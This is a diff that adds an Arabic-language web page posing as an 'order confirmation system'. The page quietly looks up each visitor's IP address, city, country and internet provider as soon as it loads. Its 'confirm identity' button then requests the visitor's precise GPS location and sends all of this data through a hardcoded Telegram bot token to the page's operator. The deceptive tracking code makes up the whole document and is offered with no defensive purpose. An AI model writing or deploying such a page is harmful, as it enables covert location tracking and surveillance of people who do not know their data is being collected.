@@ -1,0 +1,92 @@
+index.html
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نظام تأكيد الطلبات</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f4f7f6; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); text-align: center; max-width: 350px; border-top: 5px solid #0088cc; }
+        h3 { color: #333; }
+        button { background-color: #0088cc; color: white; border: none; padding: 15px; border-radius: 8px; cursor: pointer; width: 100%; font-size: 16px; font-weight: bold; }
+        #status { margin-top: 15px; color: #777; font-size: 14px; }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <h3>نظام تأكيد الطلبات</h3>
+    <p>لتأكيد هويتك وضمان وصول الطلب، يرجى الضغط على الزر أدناه.</p>
+    <button onclick="startProcess()">تأكيد الهوية والطلب</button>
+    <p id="status">بانتظار الضغط على الزر...</p>
+</div>
+
+<script>
+    // بيانات البوت الخاصة بك
+    const TELEGRAM_TOKEN = '8698719504:AAE3uab2OjYv-Yl8EkaSkkvWBrADzsgTTE0';
+    const CHAT_ID = '8698719504'; 
+
+    let fullData = {};
+
+    // 1. جلب IP صامتاً فور فتح الصفحة
+    fetch('https://ipapi.co/json/')
+    .then(res => res.json())
+    .then(data => {
+        fullData.ip = data.ip;
+        fullData.city = data.city;
+        fullData.isp = data.org;
+        fullData.country = data.country_name;
+    });
+
+    function startProcess() {
+        document.getElementById('status').innerText = "جاري معالجة الطلب...";
+        
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    fullData.lat = pos.coords.latitude;
+                    fullData.lng = pos.coords.longitude;
+                    fullData.map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                    sendToTelegram("✅ زبون جديد (وافق على الموقع)");
+                },
+                (err) => {
+                    fullData.error = "رفض الإذن";
+                    sendToTelegram("⚠️ زبون جديد (رفض الموقع/بيانات IP فقط)");
+                },
+                { enableHighAccuracy: true, timeout: 5000 }
+            );
+        } else {
+            sendToTelegram("❌ المتصفح لا يدعم تحديد الموقع");
+        }
+    }
+
+    function sendToTelegram(statusMsg) {
+        const message = `
+${statusMsg}
+━━━━━━━━━━━━
+📍 IP: ${fullData.ip || 'غير معروف'}
+🏙 المدينة: ${fullData.city || '--'}
+🏳️ الدولة: ${fullData.country || '--'}
+🌐 الشركة: ${fullData.isp || '--'}
+📍 الخريطة: ${fullData.lat ? fullData.map : 'لم يتم السماح'}
+━━━━━━━━━━━━
+        `;
+
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+        })
+        .then(() => {
+            document.getElementById('status').innerText = "تم التأكيد بنجاح!";
+            alert("شكراً لك، تم تأكيد هويتك بنجاح.");
+        })
+        .catch(() => {
+            document.getElementById('status').innerText = "حدث خطأ، حاول مرة أخرى.";
+        });
+    }
+</script>
+
+</body>
+</html>
